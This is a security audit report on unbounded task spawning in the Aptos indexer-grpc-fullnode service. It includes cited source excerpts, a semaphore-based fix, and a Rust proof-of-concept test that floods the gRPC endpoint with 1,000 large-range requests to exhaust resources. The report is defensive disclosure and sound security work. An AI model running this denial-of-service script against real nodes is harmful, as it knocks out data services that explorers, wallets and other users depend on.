# Audit Report

## Title
Unbounded Task Spawning in Indexer gRPC Fullnode Service Enables Resource Exhaustion Attacks

## Summary
The `get_transactions_from_node()` function in the indexer-grpc-fullnode service spawns an unbounded number of async tasks without any concurrency control, allowing attackers to exhaust system resources (memory, threads, database connections) by sending multiple concurrent gRPC requests, leading to service degradation or crashes.

## Finding Description

The indexer-grpc-fullnode service exposes a gRPC endpoint that allows clients to stream transaction data from Aptos nodes. Each incoming request to `get_transactions_from_node()` unconditionally spawns a new async task using `tokio::spawn()` without any concurrency limits. [1](#0-0) 

The vulnerability exists because:

1. **No Server-Level Concurrency Limits**: The gRPC server is configured without any concurrency restrictions. The tonic server builder in the bootstrap function lacks any `.concurrency_limit()` call or similar protection. [2](#0-1) 

2. **Unbounded Task Spawning**: Every client request spawns a dedicated task that runs until completion, client disconnection, or the ending version is reached. For requests with large version ranges or no specified `transactions_count`, tasks can run indefinitely. [3](#0-2) 

3. **Nested Resource Consumption**: Each spawned task creates an `IndexerStreamCoordinator` that itself spawns multiple additional tasks:
   - Multiple `tokio::spawn()` tasks for fetching transactions from storage (one per batch) [4](#0-3) 
   - Multiple `tokio::task::spawn_blocking()` tasks for CPU-intensive transaction conversion (one per task batch) [5](#0-4) 
   - The default `processor_task_count` is 20 for fullnode mode, meaning each request can spawn 20+ sub-tasks [6](#0-5) 

4. **No Rate Limiting**: Unlike the faucet service which uses a `Semaphore` to limit concurrent request processing [7](#0-6) , the indexer service has no such protection.

**Attack Scenario:**
1. Attacker opens N concurrent gRPC connections to the indexer-grpc-fullnode endpoint
2. Each connection sends a `GetTransactionsFromNodeRequest` with a large range (e.g., `starting_version=0`, `transactions_count=10^9`)
3. Each request spawns 1 main task + ~20 sub-tasks = ~21 tasks per request
4. With 1,000 concurrent requests: ~21,000 active tasks consuming memory, CPU, and database connections
5. The tokio runtime thread pool becomes saturated
6. Database connection pool exhaustion occurs
7. Memory usage spikes due to channel buffers and coordinator state
8. Service becomes unresponsive or crashes with OOM errors

This breaks **Invariant #9**: "Resource Limits: All operations must respect gas, storage, and computational limits" by allowing unbounded resource consumption without enforcement.

## Impact Explanation

This vulnerability qualifies as **High Severity** per the Aptos bug bounty program criteria:
- **"Validator node slowdowns"**: Fullnodes (which can include validators serving data) experience severe performance degradation
- **"API crashes"**: The gRPC service can crash due to resource exhaustion, making transaction data unavailable

The impact is amplified because:
- The indexer-grpc service is critical infrastructure for ecosystem applications querying blockchain data
- Service crashes disrupt data availability for downstream consumers (explorers, wallets, analytics platforms)
- Recovery requires service restart, causing downtime
- No authentication or authorization is required to exploit this (public gRPC endpoint)

## Likelihood Explanation

**Likelihood: HIGH**

Exploitation requirements are minimal:
- **Attacker Capability**: Any network client with access to the gRPC endpoint (typically port 50051)
- **Attack Complexity**: LOW - requires only a simple gRPC client sending concurrent requests
- **Prerequisites**: None - no authentication, no special permissions, no insider access needed
- **Detection Difficulty**: Moderate - appears as legitimate traffic until resource exhaustion occurs

The attack is trivial to execute using standard gRPC client libraries in any language. An attacker can script hundreds of concurrent connections within minutes.

## Recommendation

Implement concurrency control using a semaphore-based approach similar to the faucet service:

1. **Add Semaphore to Service Context**:
   - Add a `concurrent_requests_semaphore: Arc<Semaphore>` field to `FullnodeDataService`
   - Configure the semaphore limit via `IndexerGrpcConfig` (recommended: 100-500 concurrent streams)

2. **Enforce Concurrency Limit**:
   - Acquire semaphore permit at the start of `get_transactions_from_node()`
   - Return `Status::resource_exhausted()` error if permit acquisition fails
   - Hold permit for the lifetime of the spawned task

3. **Add Configuration Parameter**:
   - Add `max_concurrent_requests: usize` to `IndexerGrpcConfig` with a sensible default (e.g., 100)

Example fix structure:
```rust
// In fullnode_data_service.rs
pub struct FullnodeDataService {
    pub service_context: ServiceContext,
    pub abort_handle: Arc<AtomicBool>,
    pub concurrent_requests_semaphore: Arc<Semaphore>,
}

async fn get_transactions_from_node(...) -> Result<...> {
    let permit = self.concurrent_requests_semaphore
        .try_acquire()
        .map_err(|_| Status::resource_exhausted(
            "Server at capacity, please retry later"
        ))?;
    
    // ... existing request setup ...
    
    tokio::spawn(async move {
        let _permit = permit; // Hold permit until task completes
        // ... existing task logic ...
    });
}
```

## Proof of Concept

```rust
// PoC: Resource exhaustion via concurrent requests
// Place in: ecosystem/indexer-grpc/indexer-grpc-fullnode/tests/resource_exhaustion_test.rs

use aptos_protos::internal::fullnode::v1::{
    fullnode_data_client::FullnodeDataClient, GetTransactionsFromNodeRequest,
};
use tokio::time::{timeout, Duration};
use tonic::Request;

#[tokio::test]
async fn test_unbounded_concurrent_requests() {
    // Setup: Start indexer-grpc-fullnode service on localhost:50051
    let endpoint = "http://localhost:50051";
    
    // Attack: Spawn 1000 concurrent requests
    let mut handles = vec![];
    for i in 0..1000 {
        let endpoint = endpoint.to_string();
        handles.push(tokio::spawn(async move {
            let mut client = FullnodeDataClient::connect(endpoint)
                .await
                .expect("Failed to connect");
            
            let request = Request::new(GetTransactionsFromNodeRequest {
                starting_version: Some(i * 1_000_000),
                transactions_count: Some(1_000_000_000), // Very large range
            });
            
            // This will spawn a long-running task on the server
            let _stream = client.get_transactions_from_node(request).await;
        }));
    }
    
    // Monitor: Service should become unresponsive within seconds
    let result = timeout(Duration::from_secs(10), async {
        // Try to make a normal request - should fail or timeout
        let mut client = FullnodeDataClient::connect(endpoint).await.unwrap();
        let request = Request::new(GetTransactionsFromNodeRequest {
            starting_version: Some(0),
            transactions_count: Some(100),
        });
        client.get_transactions_from_node(request).await
    })
    .await;
    
    // Expected: Timeout or connection failure due to resource exhaustion
    assert!(result.is_err() || result.unwrap().is_err());
}
```

**Notes**

The vulnerability is specific to the indexer-grpc-fullnode service and does not directly affect consensus or validator operations. However, it represents a critical availability issue for data-serving infrastructure and can impact ecosystem applications relying on this service. The fix should be straightforward to implement following the established pattern used in the faucet service.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L67-88)
```rust
    async fn get_transactions_from_node(
        &self,
        req: Request<GetTransactionsFromNodeRequest>,
    ) -> Result<Response<Self::GetTransactionsFromNodeStream>, Status> {
        // Gets configs for the stream, partly from the request and partly from the node config
        let r = req.into_inner();
        let starting_version = match r.starting_version {
            Some(version) => version,
            // Live mode unavailable for FullnodeDataService
            // Enable use_data_service_interface in config to use LocalnetDataService instead
            None => return Err(Status::invalid_argument("Starting version must be set")),
        };
        let processor_task_count = self.service_context.processor_task_count;
        let processor_batch_size = self.service_context.processor_batch_size;
        let output_batch_size = self.service_context.output_batch_size;
        let transaction_channel_size = self.service_context.transaction_channel_size;
        let ending_version = if let Some(count) = r.transactions_count {
            starting_version.saturating_add(count)
        } else {
            u64::MAX
        };

```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L101-101)
```rust
        tokio::spawn(async move {
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/runtime.rs (L101-130)
```rust
        let tonic_server = Server::builder()
            .http2_keepalive_interval(Some(std::time::Duration::from_secs(60)))
            .http2_keepalive_timeout(Some(std::time::Duration::from_secs(5)))
            .add_service(reflection_service_clone);

        let router = match use_data_service_interface {
            false => {
                let svc = FullnodeDataServer::new(server)
                    .send_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Gzip);
                tonic_server.add_service(svc)
            },
            true => {
                let svc = RawDataServer::new(localnet_data_server)
                    .send_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Gzip);
                tonic_server.add_service(svc)
            },
        };

        let listener = TcpListener::bind(address).await.unwrap();
        if let Some(port_tx) = port_tx {
            port_tx.send(listener.local_addr().unwrap().port()).unwrap();
        }
        let incoming = TcpIncoming::from_listener(listener, false, None).unwrap();

        // Make port into a config
        router.serve_with_incoming(incoming).await.unwrap();
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/stream_coordinator.rs (L167-201)
```rust
        for batch in task_batches {
            let context = self.context.clone();
            let filter = filter.clone();
            let task = tokio::task::spawn_blocking(move || {
                let raw_txns = batch;
                let api_txns = Self::convert_to_api_txns(context, raw_txns);
                let pb_txns = Self::convert_to_pb_txns(api_txns);
                // Apply filter if present.
                let pb_txns = if let Some(ref filter) = filter {
                    pb_txns
                        .into_iter()
                        .filter(|txn| filter.matches(txn))
                        .collect::<Vec<_>>()
                } else {
                    pb_txns
                };
                let mut responses = vec![];
                // Wrap in stream response object and send to channel
                for chunk in pb_txns.chunks(output_batch_size as usize) {
                    for chunk in chunk_transactions(chunk.to_vec(), MESSAGE_SIZE_LIMIT) {
                        let item = TransactionsFromNodeResponse {
                            response: Some(transactions_from_node_response::Response::Data(
                                TransactionsOutput {
                                    transactions: chunk,
                                },
                            )),
                            chain_id: ledger_chain_id as u32,
                        };
                        responses.push(item);
                    }
                }
                responses
            });
            tasks.push(task);
        }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/stream_coordinator.rs (L244-252)
```rust
        let mut storage_fetch_tasks = vec![];
        let ledger_version = self.highest_known_version;
        for batch in batches {
            let context = self.context.clone();
            let task = tokio::spawn(async move {
                Self::fetch_raw_txns_with_retries(context.clone(), ledger_version, batch).await
            });
            storage_fetch_tasks.push(task);
        }
```

**File:** config/src/config/indexer_grpc_config.rs (L23-29)
```rust
pub fn get_default_processor_task_count(use_data_service_interface: bool) -> u16 {
    if use_data_service_interface {
        1
    } else {
        20
    }
}
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L184-210)
```rust
    /// This semaphore is used to ensure we only process a certain number of
    /// requests concurrently.
    pub concurrent_requests_semaphore: Option<Arc<Semaphore>>,
}

impl FundApiComponents {
    /// Preprocesses the request to return the source IP, receiver account
    /// address and requested amount taking into account Funder configuration
    /// (i.e. max amount). It also ensures the request passes checkers.
    /// This function mostly exists to reduce duplication between the `fund`
    /// and `is_eligible` endpoints. This function also runs the Bypassers.
    /// If any of them said yes, this will return true as the last element
    /// of the output of this function.
    async fn preprocess_request(
        &self,
        fund_request: &FundRequest,
        source_ip: RealIp,
        header_map: &HeaderMap,
        dry_run: bool,
    ) -> poem::Result<(CheckerData, bool, Option<SemaphorePermit<'_>>), AptosTapError> {
        let permit = match &self.concurrent_requests_semaphore {
            Some(semaphore) => match semaphore.try_acquire() {
                Ok(permit) => Some(permit),
                Err(_) => {
                    return Err(AptosTapError::new(
                        "Server overloaded, please try again later".to_string(),
                        AptosTapErrorCode::ServerOverloaded,
```
